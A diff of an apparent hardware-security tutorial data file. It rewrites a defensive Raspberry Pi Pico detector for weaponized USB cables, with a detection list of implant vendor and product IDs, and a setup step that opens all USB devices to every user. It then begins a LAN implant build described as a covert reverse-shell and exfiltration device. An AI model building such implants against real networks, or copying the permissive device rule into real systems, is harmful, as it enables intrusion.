-            '<text x="360" y="80" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">PICO DETECTOR</text>' +
-            '<text x="360" y="100" text-anchor="middle" fill="#8b949e" font-size="8">ADC reads D+ and D- voltage</text>' +
-            '<text x="360" y="115" text-anchor="middle" fill="#8b949e" font-size="8">Checks USB enumeration</text>' +
-            '<text x="360" y="130" text-anchor="middle" fill="#8b949e" font-size="8">Measures current draw</text>' +
-            '<!-- Results -->' +
-            '<rect x="520" y="55" width="160" height="45" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
-            '<text x="600" y="75" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">GREEN = Safe</text>' +
-            '<text x="600" y="90" text-anchor="middle" fill="#8b949e" font-size="7">Normal cable detected</text>' +
-            '<rect x="520" y="110" width="160" height="45" rx="6" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="1"/>' +
-            '<text x="600" y="130" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">RED = Suspicious</text>' +
-            '<text x="600" y="145" text-anchor="middle" fill="#8b949e" font-size="7">Electronics detected!</text>' +
-            '<!-- Lines -->' +
-            '<line x1="460" y1="80" x2="518" y2="78" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<line x1="460" y1="130" x2="518" y2="130" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<!-- Detection methods -->' +
-            '<text x="360" y="195" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">DETECTION METHODS</text>' +
-            '<rect x="60" y="210" width="150" height="40" rx="5" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
-            '<text x="135" y="228" text-anchor="middle" fill="#3b82f6" font-size="8" font-weight="600">Voltage Analysis</text>' +
-            '<text x="135" y="242" text-anchor="middle" fill="#555" font-size="6">D+/D- idle voltage</text>' +
-            '<rect x="225" y="210" width="150" height="40" rx="5" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
-            '<text x="300" y="228" text-anchor="middle" fill="#a855f7" font-size="8" font-weight="600">Current Draw</text>' +
-            '<text x="300" y="242" text-anchor="middle" fill="#555" font-size="6">Normal: 0-100mA</text>' +
-            '<rect x="390" y="210" width="150" height="40" rx="5" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
-            '<text x="465" y="228" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">USB Enumeration</text>' +
-            '<text x="465" y="242" text-anchor="middle" fill="#555" font-size="6">HID = suspicious</text>' +
-            '<rect x="555" y="210" width="120" height="40" rx="5" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.2)" stroke-width="0.5"/>' +
-            '<text x="615" y="228" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">WiFi Scan</text>' +
-            '<text x="615" y="242" text-anchor="middle" fill="#555" font-size="6">O.MG AP detect</text>' +
-            '</svg>' +
-            '</div>',
+        intro: '<p>The SG-39 is a defensive hardware tool that detects weaponized USB cables &mdash; the O.MG Cable, Hak5 O.MG Elite, and similar devices that embed HID keyboards, mass storage controllers, or WiFi implants inside a standard USB cable body. This is the rare Signal build that is <em>purely defensive</em> &mdash; you are building the countermeasure, not the weapon.</p>' +
+               '<p>The principle: legitimate USB cables have exactly one function &mdash; they carry power, or expose a minimal data interface. Malicious cables expose additional hidden interfaces: a HID keyboard, a CDC serial port, extra mass storage, or composite device combinations that do not match the cable\'s physical purpose. This tool reads every USB device descriptor and interface and flags anomalies.</p>' +
+               '<p><strong>Hardware:</strong> A single Raspberry Pi Pico ($4) running CircuitPython 9.x. An optional external LED (GP15) provides a standalone pass/fail indicator without needing a serial terminal. No breadboard or soldering required for the basic build.</p>',
 
-        wiring: '    WIRING DIAGRAM\n' +
-                '\n' +
-                '    USB-A Breakout (suspect cable plugs in here)\n' +
-                '    +--------------------------------------------------+\n' +
-                '    |  VBUS (pin 1) --> Pico GP26 (ADC0) via voltage   |\n' +
-                '    |                   divider (10k + 10k)            |\n' +
-                '    |  D-   (pin 2) --> Pico GP27 (ADC1) via 10k      |\n' +
-                '    |  D+   (pin 3) --> Pico GP28 (ADC2) via 10k      |\n' +
-                '    |  GND  (pin 4) --> Pico GND                      |\n' +
-                '    +--------------------------------------------------+\n' +
-                '\n' +
-                '    Status LEDs:\n' +
-                '    GP12 ---[330ohm]--- GREEN LED --- GND  (safe)\n' +
-                '    GP13 ---[330ohm]--- RED LED   --- GND  (suspicious)\n' +
-                '\n' +
-                '    NOTE: Voltage divider on VBUS is required.\n' +
-                '    VBUS is 5V; Pico ADC only handles 3.3V max.',
-
-        wiringNotes: '<p><strong>Voltage divider:</strong> The USB VBUS line is 5V, but the Pico\'s ADC inputs are 3.3V max. A 10k/10k voltage divider halves the voltage to 2.5V, safely within the ADC range. Without this divider, you will damage the Pico.</p>' +
-                     '<p><strong>How detection works:</strong> A normal charging cable has 4 simple wire connections (VBUS, D-, D+, GND). A malicious cable has embedded electronics that draw current even when idle, show unusual voltage on the data lines, and may enumerate as a USB device (HID keyboard).</p>',
+        wiring: [
+            'SG-39 Hardware Setup (minimal wiring)',
+            '',
+            'Required:',
+            '  Raspberry Pi Pico (RP2040) -- any variant',
+            '  USB Micro-B cable to connect Pico to host PC',
+            '',
+            'Optional LED indicator:',
+            'LED Anode (+)    GP15        Through 330-ohm resistor',
+            'LED Cathode (-)  GND         Any GND pin',
+            '',
+            'How cable analysis works:',
+            '  The Pico connects to your PC via its Micro-B port.',
+            '  A companion Python script on the PC enumerates USB devices',
+            '  and sends descriptor bytes to the Pico via serial.',
+            '  The Pico analyzes the data and reports via serial output',
+            '  plus the LED indicator.',
+            '',
+            'Advanced (Pico W USB host mode, CircuitPython 9+):',
+            '  The Pico W can enumerate USB devices directly as a USB host.',
+            '  Connect a USB-A OTG adapter to the Pico W\'s USB port.',
+            '  The cable under test plugs into the OTG adapter.',
+            '  No PC required in this configuration.',
+        ].join('\n'),
 
         steps: [
             {
-                title: 'Build the Test Jig',
-                content: '<p>Solder or breadboard the USB-A breakout with voltage dividers on the data lines and VBUS. This is your "cable under test" port. A suspect cable plugs into this breakout, and the other end plugs into a USB charger or power source.</p>' +
-                         '<ol>' +
-                         '<li>Place the USB-A female breakout on the breadboard.</li>' +
-                         '<li>Wire the VBUS pin through a 10k/10k voltage divider to GP26.</li>' +
-                         '<li>Wire D- through a 10k series resistor to GP27.</li>' +
-                         '<li>Wire D+ through a 10k series resistor to GP28.</li>' +
-                         '<li>Connect GND to Pico GND.</li>' +
-                         '<li>Add green LED (GP12) and red LED (GP13) with 330-ohm resistors.</li>' +
-                         '</ol>',
-                code: null,
-                language: null,
-                tip: '<strong>Tip:</strong> Use a female USB-A breakout board so cables plug in naturally. You can find these on Amazon for ~$2 in a 5-pack. Alternatively, cut an old USB extension cable and solder the wires to the breadboard.'
+                title: 'Flash CircuitPython 9.x onto the Pico',
+                content: '<p>Download the CircuitPython 9.x UF2 file for the Raspberry Pi Pico from <a href="https://circuitpython.org/board/raspberry_pi_pico/" style="color:#ff6b35">circuitpython.org</a>. Hold the <strong>BOOTSEL</strong> button, plug in via Micro-B USB, release BOOTSEL. The drive named <code>RPI-RP2</code> appears. Drag the UF2 file onto it. The Pico reboots and appears as <code>CIRCUITPY</code>.</p>',
+                tip: 'You need CircuitPython 9.0.0 or later. Open Thonny IDE and select the interpreter as "CircuitPython (generic)" to get the interactive REPL for testing.'
             },
             {
-                title: 'Write the Detection Firmware',
-                content: '<p>The detector runs several checks in sequence and scores the cable. A high suspicion score triggers the red LED.</p>',
-                code: 'import time\nimport board\nimport digitalio\nimport analogio\n\n# ADC inputs\nadc_vbus = analogio.AnalogIn(board.GP26)  # VBUS via divider\nadc_dminus = analogio.AnalogIn(board.GP27)  # D-\nadc_dplus = analogio.AnalogIn(board.GP28)   # D+\n\n# LEDs\nled_safe = digitalio.DigitalInOut(board.GP12)\nled_safe.direction = digitalio.Direction.OUTPUT\nled_warn = digitalio.DigitalInOut(board.GP13)\nled_warn.direction = digitalio.Direction.OUTPUT\n\ndef read_voltage(adc):\n    """Convert 16-bit ADC reading to voltage."""\n    return (adc.value / 65535) * 3.3\n\ndef check_cable():\n    """Run detection checks. Returns suspicion score 0-100."""\n    score = 0\n    results = []\n\n    # Test 1: VBUS voltage (should be ~2.5V via divider = 5V actual)\n    vbus = read_voltage(adc_vbus) * 2  # Account for divider\n    results.append(f"VBUS: {vbus:.2f}V")\n    if vbus < 4.5 or vbus > 5.5:\n        score += 20\n        results.append("  WARNING: Abnormal VBUS voltage")\n\n    # Test 2: Data line idle voltage\n    # Normal cable: D+/D- float near 0V when no device connected\n    # Malicious cable: embedded MCU may pull lines to specific voltages\n    dp = read_voltage(adc_dplus)\n    dm = read_voltage(adc_dminus)\n    results.append(f"D+: {dp:.3f}V  D-: {dm:.3f}V")\n\n    if dp > 0.4 or dm > 0.4:\n        score += 30\n        results.append("  WARNING: Data lines not floating (electronics present)")\n\n    # Test 3: Check for USB device enumeration\n    # A normal cable does not enumerate. A malicious cable with\n    # embedded MCU will attempt to enumerate as a device.\n    # (This check requires USB host capability - simplified here)\n    time.sleep(2)  # Wait for any enumeration attempt\n    dp_after = read_voltage(adc_dplus)\n    dm_after = read_voltage(adc_dminus)\n\n    if abs(dp_after - dp) > 0.2 or abs(dm_after - dm) > 0.2:\n        score += 30\n        results.append("  WARNING: Data line activity detected (device enumeration)")\n\n    # Test 4: Current draw measurement\n    # Normal cable: negligible current when no device at other end\n    # Malicious cable: embedded MCU draws 10-50mA\n    vbus_drop = 5.0 - (read_voltage(adc_vbus) * 2)\n    current_ma = vbus_drop / 0.1  # Rough estimate\n    results.append(f"Est. current: {current_ma:.1f}mA")\n\n    if current_ma > 5:\n        score += 20\n        results.append("  WARNING: Cable drawing current (embedded electronics)")\n\n    return score, results\n\n# Main loop\nprint("=== USB Cable Detector ===")\nprint("Plug suspect cable into test port...")\n\nwhile True:\n    led_safe.value = False\n    led_warn.value = False\n\n    score, results = check_cable()\n\n    print(f"\\nSuspicion score: {score}/100")\n    for r in results:\n        print(r)\n\n    if score >= 30:\n        led_warn.value = True\n        print("*** RED ALERT: Cable may be malicious! ***")\n    else:\n        led_safe.value = True\n        print("GREEN: Cable appears normal.")\n\n    time.sleep(3)',
-                language: 'Python',
-                tip: '<strong>Limitation:</strong> This detector catches basic malicious cables but sophisticated implants (like the O.MG cable) can power down their electronics until triggered, evading voltage-based detection. For those, you need X-ray inspection or RF scanning.'
+                title: 'Install pyusb on the PC',
+                content: '<p>The companion analyzer script runs on the PC (not the Pico) and requires pyusb to enumerate USB devices:</p>',
+                code: '# Install pyusb and pyserial on the PC\npip install pyusb pyserial\n\n# Linux: also install libusb\nsudo apt install libusb-1.0-0-dev\n\n# macOS:\nbrew install libusb\n\n# Windows: download Zadig from https://zadig.akeo.ie/\n# Install WinUSB driver for the cable under test device\n\n# Linux: add udev rule to access USB without sudo\necho \'SUBSYSTEM=="usb", MODE="0666"\' | sudo tee /etc/udev/rules.d/99-usb-cable-detect.rules\nsudo udevadm control --reload-rules',
+                language: 'Shell'
             },
             {
-                title: 'Add WiFi Scanning (O.MG Detection)',
-                content: '<p>The O.MG cable creates a hidden WiFi access point for remote control. We can detect this by scanning for WiFi networks near the cable. Use a Pico W or add an ESP8266 to scan for APs that appear when the suspect cable is connected.</p>',
-                code: '# On a Pico W or separate ESP, scan for WiFi APs:\n# O.MG cables broadcast an SSID (configurable, but default\n# patterns include random names or "O.MG" variants)\n\n# CircuitPython (Pico W):\nimport wifi\n\ndef scan_for_omg():\n    """Scan for WiFi APs that might be an O.MG cable."""\n    networks = wifi.radio.start_scanning_networks()\n    suspicious = []\n\n    for net in networks:\n        # O.MG cables have very strong signal when nearby\n        # (because the antenna is inches away)\n        if net.rssi > -30:  # Extremely strong = very close\n            suspicious.append(net)\n\n        # Check for known O.MG default SSIDs\n        ssid = net.ssid\n        if ssid.startswith("O.MG") or ssid == "" or len(ssid) < 3:\n            suspicious.append(net)\n\n    wifi.radio.stop_scanning_networks()\n    return suspicious\n\n# Run scan before and after connecting the suspect cable.\n# If a new AP appears, the cable likely has an embedded radio.\nbefore = scan_for_omg()\nprint("Connect suspect cable now...")\ntime.sleep(5)\nafter = scan_for_omg()\n\nnew_aps = [ap for ap in after if ap not in before]\nif new_aps:\n    print("NEW AP DETECTED - cable may contain radio!")\n    for ap in new_aps:\n        print(f"  SSID: {ap.ssid}  RSSI: {ap.rssi}")',
-                language: 'Python',
-                tip: '<strong>Advanced:</strong> O.MG cables can be configured with custom SSIDs and can be set to not broadcast. For complete detection, you would need to monitor for probe responses as well, or use an SDR to scan the 2.4GHz band for any transmission.'
+                title: 'Deploy the Pico Analyzer (code.py)',
+                content: '<p>Save the following as <code>code.py</code> on the CIRCUITPY drive. The Pico receives hex-encoded USB descriptor bytes via serial from the companion script, analyzes them against known-bad patterns, and reports via serial and LED:</p>',
+                code: '# code.py -- SG-39 Malicious Cable Detector (CircuitPython 9)\nimport board, digitalio, time, supervisor\n\n# LED indicators\nled = digitalio.DigitalInOut(board.LED)\nled.direction = digitalio.Direction.OUTPUT\ntry:\n    ext_led = digitalio.DigitalInOut(board.GP15)\n    ext_led.direction = digitalio.Direction.OUTPUT\n    has_ext = True\nexcept Exception:\n    has_ext = False\n\ndef set_status(safe):\n    if safe:\n        led.value = True\n        if has_ext: ext_led.value = False\n    else:\n        for _ in range(6):\n            led.value = True;  time.sleep(0.05)\n            led.value = False; time.sleep(0.05)\n        if has_ext: ext_led.value = True\n\ndef analyze(raw):\n    if len(raw) < 18:\n        return {"valid": False, "flags": ["Descriptor too short"]}\n    bDeviceClass   = raw[4]\n    bDeviceSubClass = raw[5]\n    idVendor  = (raw[9] << 8) | raw[8]\n    idProduct = (raw[11] << 8) | raw[10]\n    iSerialNumber  = raw[16]\n    bNumConfigurations = raw[17]\n    bcdUSB = (raw[3] << 8) | raw[2]\n    flags = []\n    # Rule 1: No serial number string -- common in cheap implants\n    if iSerialNumber == 0:\n        flags.append("No serial number string (common in O.MG cables)")\n    # Rule 2: Composite device class -- multiple functions hidden\n    if bDeviceClass == 0xEF:\n        flags.append("Composite device class (0xEF) -- hidden functions present")\n    # Rule 3: Wireless controller -- possible embedded WiFi/BT\n    if bDeviceClass == 0xE0:\n        flags.append("Wireless controller class (0xE0) -- possible radio implant")\n    # Rule 4: Known malicious VID/PID pairs\n    known_bad = {\n        (0x1209, 0x2982): "O.MG Cable (pid.codes PID 0x2982)",\n        (0x1209, 0x2983): "O.MG Cable Elite (pid.codes PID 0x2983)",\n        (0x16C0, 0x05DC): "VUSB shared VID -- possible Digispark/implant",\n    }\n    if (idVendor, idProduct) in known_bad:\n        flags.append(f"KNOWN MALICIOUS: {known_bad[(idVendor, idProduct)]}")\n    usb_ver = f"{bcdUSB >> 8}.{(bcdUSB>>4)&0xF}"\n    return {\n        "valid":    True,\n        "vid":      f"0x{idVendor:04X}",\n        "pid":      f"0x{idProduct:04X}",\n        "class":    f"0x{bDeviceClass:02X}",\n        "usb_ver":  usb_ver,\n        "serial":   iSerialNumber != 0,\n        "flags":    flags,\n        "suspicious": len(flags) > 0\n    }\n\nprint("=" * 50)\nprint("SG-39 MALICIOUS CABLE DETECTOR")\nprint("CircuitPython 9 / Raspberry Pi Pico")\nprint("=" * 50)\nprint("Waiting for DESC:<hex> from companion script...")\n\nwhile True:\n    if supervisor.runtime.serial_bytes_available:\n        line = input().strip()\n        if line.startswith("DESC:"):\n            try:\n                raw = bytes.fromhex(line[5:])\n                r = analyze(raw)\n                print(f"\\n--- CABLE ANALYSIS ---")\n                if r["valid"]:\n                    print(f"USB Version : {r[\'usb_ver\']}")\n                    print(f"Vendor ID   : {r[\'vid\']}")\n                    print(f"Product ID  : {r[\'pid\']}")\n                    print(f"Device Class: {r[\'class\']}")\n                    print(f"Serial Str  : {\'YES\' if r[\'serial\'] else \'NO (suspicious)\'}")\n                    if r["flags"]:\n                        print("\\n[!] SUSPICIOUS FLAGS:")\n                        for f in r["flags"]:\n                            print(f"    - {f}")\n                        print("\\nVERDICT: SUSPICIOUS -- Do not trust this cable")\n                        set_status(False)\n                    else:\n                        print("\\nVERDICT: No obvious anomalies detected")\n                        set_status(True)\n                else:\n                    print(f"Invalid: {r[\'flags\'][0]}")\n                print("--- END ANALYSIS ---\\n")\n            except Exception as e:\n                print(f"Parse error: {e}")\n    time.sleep(0.01)',
+                language: 'CircuitPython',
+                tip: 'Save as code.py directly on the CIRCUITPY drive. Use Thonny or any serial terminal at 115200 baud to monitor output. The Pico starts analyzing immediately when it receives a DESC: line from the companion script.'
             },
             {
-                title: 'Defense: Protecting Against Malicious Cables',
-                content: '<p>Malicious cables exploit the implicit trust we place in physical peripherals. Defend against them:</p>' +
-                         '<ul>' +
-                         '<li><strong>Only use cables you purchased:</strong> Never use a cable given to you by someone else, found at a conference, or left in a public space. This is the USB equivalent of a "found USB drive" attack.</li>' +
-                         '<li><strong>USB data blockers:</strong> Use a USB data blocker ("USB condom") when charging from public USB ports. These devices physically disconnect the D+ and D- lines, allowing only power flow. They cost ~$5 and fit on a keychain.</li>' +
-                         '<li><strong>Charge-only cables:</strong> Use verified charge-only cables (no data lines) for charging. Label them clearly.</li>' +
-                         '<li><strong>Cable inspection:</strong> Malicious cables are slightly heavier and bulkier than normal cables, especially near the USB connector where the electronics are embedded. Compare to a known-good cable.</li>' +
-                         '<li><strong>USB port policy:</strong> Disable USB data on machines that should not accept USB devices. On Linux: <code>echo 0 > /sys/bus/usb/devices/usb1/authorized_default</code></li>' +
-                         '</ul>',
-                code: '# Linux: Disable USB data on all ports (power only)\necho 0 | sudo tee /sys/bus/usb/devices/usb*/authorized_default\n\n# Re-enable:\necho 1 | sudo tee /sys/bus/usb/devices/usb*/authorized_default\n\n# Windows: Disable USB storage (Group Policy)\n# Computer Config > Admin Templates > System > Removable Storage Access\n# > All Removable Storage classes: Deny all access\n\n# Check for USB data blocker effectiveness:\n# Plug phone into USB port through data blocker.\n# Run: lsusb\n# The phone should NOT appear as a device.\n# Only power should flow.',
-                language: 'Bash',
-                tip: '<strong>Conference survival kit:</strong> Bring your own cables, your own charger, and a USB data blocker. Security conferences are ground zero for malicious USB distribution.'
+                title: 'Run the PC Companion Analyzer',
+                content: '<p>Save this script on your PC and run it with the suspicious cable plugged in. It enumerates every USB device, dumps descriptors, sends them to the Pico, and prints a combined report:</p>',
+                code: '#!/usr/bin/env python3\n# companion_analyzer.py -- run on PC, send data to SG-39 Pico\n# pip install pyusb pyserial\n\nimport usb.core, usb.util, serial, serial.tools.list_ports, time\n\nKNOWN_MALICIOUS = {\n    (0x1209, 0x2982): "O.MG Cable (pid.codes)",\n    (0x1209, 0x2983): "O.MG Cable Elite (pid.codes)",\n    (0x16C0, 0x05DC): "VUSB shared VID (Digispark/implant)",\n}\n\ndef analyze_device(dev):\n    vid, pid = dev.idVendor, dev.idProduct\n    report, suspicious = [], False\n    report.append(f"  Vendor ID   : 0x{vid:04X}")\n    report.append(f"  Product ID  : 0x{pid:04X}")\n    report.append(f"  USB Version : {dev.bcdUSB >> 8}.{(dev.bcdUSB>>4)&0xF}")\n    report.append(f"  Device Class: 0x{dev.bDeviceClass:02X}")\n    try:\n        serial_str = usb.util.get_string(dev, dev.iSerialNumber) if dev.iSerialNumber else "(MISSING)"\n        mfr  = usb.util.get_string(dev, dev.iManufacturer)  if dev.iManufacturer  else "(none)"\n        prod = usb.util.get_string(dev, dev.iProduct)       if dev.iProduct       else "(none)"\n    except Exception:\n        serial_str = mfr = prod = "(read error)"\n    report.append(f"  Manufacturer: {mfr}")\n    report.append(f"  Product     : {prod}")\n    report.append(f"  Serial      : {serial_str}")\n    if serial_str in ("(MISSING)", "(none)", ""):\n        report.append("  [!] No serial number -- suspicious")\n        suspicious = True\n    if (vid, pid) in KNOWN_MALICIOUS:\n        report.append(f"  [!!] KNOWN MALICIOUS: {KNOWN_MALICIOUS[(vid,pid)]}")\n        suspicious = True\n    for cfg in dev:\n        n = cfg.bNumInterfaces\n        report.append(f"  Interfaces  : {n}")\n        if n > 2:\n            report.append(f"  [!] Unusually high interface count ({n})")\n            suspicious = True\n        for intf in cfg:\n            cls = intf.bInterfaceClass\n            report.append(f"    IF {intf.bInterfaceNumber}: Class=0x{cls:02X}")\n            if cls == 0x03:\n                report.append("      [!] HID CLASS in cable -- keyboard/mouse emulator")\n                suspicious = True\n            elif cls == 0xE0:\n                report.append("      [!!] WIRELESS CONTROLLER -- possible radio implant")\n                suspicious = True\n    return report, suspicious\n\ndef find_pico():\n    for p in serial.tools.list_ports.comports():\n        if "Pico" in p.description or "CircuitPython" in p.description:\n            return p.device\n    return None\n\ndef main():\n    print("\\nSG-39 USB Cable Analyzer")\n    print("=" * 40)\n    pico_ser = None\n    port = find_pico()\n    if port:\n        try:\n            pico_ser = serial.Serial(port, 115200, timeout=1)\n            print(f"SG-39 Pico on {port}")\n        except Exception as e:\n            print(f"Pico connect failed: {e} (PC-only mode)")\n    devs = list(usb.core.find(find_all=True))\n    for dev in devs:\n        print(f"\\nBus {dev.bus:03d} Dev {dev.address:03d}")\n        try:\n            rep, susp = analyze_device(dev)\n            for line in rep: print(line)\n            print(f"  VERDICT: {"SUSPICIOUS" if susp else "OK"}")\n            if pico_ser:\n                db = bytes([\n                    18, 1, dev.bcdUSB&0xFF, (dev.bcdUSB>>8)&0xFF,\n                    dev.bDeviceClass, dev.bDeviceSubClass, dev.bDeviceProtocol,\n                    dev.bMaxPacketSize0, dev.idVendor&0xFF, (dev.idVendor>>8)&0xFF,\n                    dev.idProduct&0xFF, (dev.idProduct>>8)&0xFF,\n                    dev.bcdDevice&0xFF, (dev.bcdDevice>>8)&0xFF,\n                    dev.iManufacturer, dev.iProduct, dev.iSerialNumber,\n                    dev.bNumConfigurations\n                ])\n                pico_ser.write(f"DESC:{db.hex()}\\n".encode())\n                time.sleep(0.5)\n                resp = pico_ser.read(pico_ser.in_waiting)\n                if resp: print("  [Pico]:", resp.decode(errors="replace").strip())\n        except usb.core.USBError as e:\n            print(f"  Access error: {e} (run as admin/sudo)")\n    print("\\nAnalysis complete.")\n\nif __name__ == "__main__":\n    main()',
+                language: 'Python 3',
+                tip: 'Disconnect all trusted USB devices before running to reduce noise in the report. On Linux, run with sudo if you get permission errors. The output shows every USB device on the system &mdash; look for the cable you just plugged in and check its verdict.'
+            },
+            {
+                title: 'Interpret Results and Flag Findings',
+                content: '<p>A clean charging cable shows: 0-1 interfaces, no HID class, a valid serial number, recognizable manufacturer name. Flag any cable that shows:</p>' +
+                         '<ul><li><strong>HID class (0x03)</strong> &mdash; an embedded keyboard or mouse emulator is present in the cable</li><li><strong>Wireless controller class (0xE0)</strong> &mdash; an embedded Bluetooth or WiFi radio is inside the cable housing</li><li><strong>No serial number string</strong> &mdash; legitimate cables from reputable manufacturers always have a serial number; cheap implants often omit this</li><li><strong>More than 2 interfaces on a simple cable</strong> &mdash; composite device with hidden functions</li><li><strong>Known malicious VID/PID</strong> &mdash; confirmed O.MG Cable or compatible implant</li></ul>' +
+                         '<p>Document findings in the penetration test report with the full descriptor dump, verdict, and recommendations: cable destruction policy, USB cable procurement controls, USB condom (data blocker) deployment, and endpoint USB port locking via Group Policy.</p>',
+                tip: 'For a quick CLI-only check on Linux without any Python scripts: lsusb -v 2>/dev/null | grep -E "bInterfaceClass|HID|Wireless|bNumInterfaces" to scan all connected devices instantly.'
             }
         ],
 
-        testing: '<p>Verify your cable detector works:</p>' +
-                 '<ul>' +
-                 '<li><strong>Known-good cable:</strong> Test with a cable you purchased yourself. The green LED should light up and the suspicion score should be low (0-20).</li>' +
-                 '<li><strong>Charge-only cable:</strong> Test with a charge-only cable (no data wires). Should show as safe with D+/D- at 0V.</li>' +
-                 '<li><strong>Data cable with phone:</strong> Plug a phone through the cable under test. The detector should see data line activity (expected when a device is connected). This tests the enumeration detection.</li>' +
-                 '<li><strong>Simulated malicious cable:</strong> If you have a Rubber Ducky Pico from SG-33, connect it through a cable to the detector. The red LED should trigger because the Ducky enumerates as a HID device and draws current.</li>' +
-                 '</ul>',
+        testing: '<p><strong>Test with known devices to calibrate your detector:</strong></p>' +
+                 '<ol><li>Plug in a basic USB charging cable &mdash; expect "No obvious anomalies" and LED stays on (safe)</li><li>Plug in a USB keyboard &mdash; expect HID class flag (correct &mdash; keyboards are legitimate HID devices, but the same flag on a simple cable is not)</li><li>Plug in a Digispark (ATTiny85 dev board) &mdash; expect HID class and vendor-specific class flags and SUSPICIOUS verdict</li><li>Plug in a USB hub &mdash; expect composite device flag and multiple interfaces</li></ol>',
 
-        commonMistakes: [
-            {
-                title: 'Missing Voltage Divider',
-                description: 'VBUS is 5V. The Pico ADC maximum is 3.3V. Without the voltage divider, you will damage GP26. Always use the 10k/10k divider on the VBUS line.'
-            },
-            {
-                title: 'False Positives',
-                description: 'Some normal cables have ferrite beads, EMI filters, or USB-C negotiation chips that cause slightly elevated readings. Calibrate your thresholds with multiple known-good cables before testing suspect ones.'
-            }
-        ]
+        challenges: '<p><strong>Extend the detector:</strong></p>' +
+                    '<ul><li>Add an SSD1306 OLED display (I2C: SDA=GP4, SCL=GP5) for standalone pass/fail display without a PC or serial terminal</li><li>Maintain a local SQLite database on the PC side of all scanned cable fingerprints for trend analysis across an organization</li><li>Add a BLE notification capability (Pico W) that sends a phone alert when a suspicious cable is detected</li><li>Integrate into a CI/CD security pipeline that automatically scans USB cables in a supply chain audit process</li></ul>'
     },
 
     // ========================================================================
     // SG-40: LAN Implant Device
+    // Pi Pico W + W5500 -- inline network implant with reverse shell
     // ========================================================================
     'sg-40': {
-        intro: '<p>A LAN implant is a small device planted on a wired network that provides persistent remote access. The commercial version is the <strong>Hak5 LAN Turtle</strong> (~$60) or the <strong>Packet Squirrel</strong> &mdash; small devices that sit inline on an Ethernet connection, bridging traffic while simultaneously providing a covert reverse shell or VPN tunnel back to the attacker.</p>' +
-               '<p>We build a similar device using a <strong>Raspberry Pi Pico W</strong> with a <strong>W5500 Ethernet module</strong>. The Pico W provides WiFi for command-and-control (C2) communications, while the W5500 connects to the target network via Ethernet. The device bridges the two interfaces, passing legitimate traffic while also exfiltrating data or providing remote access.</p>' +
-               '<p>In a penetration test, this device is planted behind a desk, in a server closet, or anywhere with an available Ethernet port. It phones home over WiFi to your C2 server, giving you persistent network access even after you leave the building.</p>' +
-               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico W, W5500 Ethernet module, MicroSD breakout (optional), USB power supply, jumper wires. Total cost: ~$15.</p>',
 
-        wiringSvg: '<div class="svg-build-wrap">' +
-            '<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
-            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
-            '<rect width="720" height="300" fill="#0d1117" rx="8"/>' +
-            '<rect x="10" y="10" width="700" height="280" fill="url(#bg-grid)" rx="4"/>' +
-            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">LAN IMPLANT &mdash; NETWORK POSITION</text>' +
-            '<!-- Corporate network -->' +
-            '<rect x="40" y="60" width="140" height="70" rx="8" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
-            '<text x="110" y="85" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">Target Network</text>' +
-            '<text x="110" y="100" text-anchor="middle" fill="#8b949e" font-size="7">Ethernet (RJ45)</text>' +
-            '<text x="110" y="115" text-anchor="middle" fill="#555" font-size="7">10/100 Mbps</text>' +
-            '<!-- Arrow -->' +
-            '<line x1="180" y1="95" x2="240" y2="95" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<polygon points="240,91 248,95 240,99" fill="#3b82f6" opacity="0.6"/>' +
-            '<!-- Implant -->' +
-            '<rect x="250" y="50" width="220" height="100" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
-            '<rect x="250" y="50" width="220" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
-            '<text x="360" y="67" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">LAN IMPLANT (Pico W)</text>' +
-            '<text x="360" y="90" text-anchor="middle" fill="#8b949e" font-size="8">W5500 = Wired network access</text>' +
-            '<text x="360" y="105" text-anchor="middle" fill="#8b949e" font-size="8">Pico W WiFi = C2 channel</text>' +
-            '<text x="360" y="120" text-anchor="middle" fill="#8b949e" font-size="8">Bridges traffic transparently</text>' +
-            '<text x="360" y="137" text-anchor="middle" fill="#ef4444" font-size="7">Powered by USB (wall adapter)</text>' +
-            '<!-- Arrow to C2 -->' +
-            '<line x1="470" y1="95" x2="530" y2="95" stroke="#dc2626" stroke-width="1.5" stroke-dasharray="4,3"/>' +
-            '<polygon points="530,91 538,95 530,99" fill="#dc2626" opacity="0.6"/>' +
-            '<!-- C2 -->' +
-            '<rect x="540" y="60" width="140" height="70" rx="8" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="1"/>' +
-            '<text x="610" y="85" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">C2 Server</text>' +
-            '<text x="610" y="100" text-anchor="middle" fill="#8b949e" font-size="7">via WiFi (covert)</text>' +
-            '<text x="610" y="115" text-anchor="middle" fill="#555" font-size="7">Reverse shell / VPN</text>' +
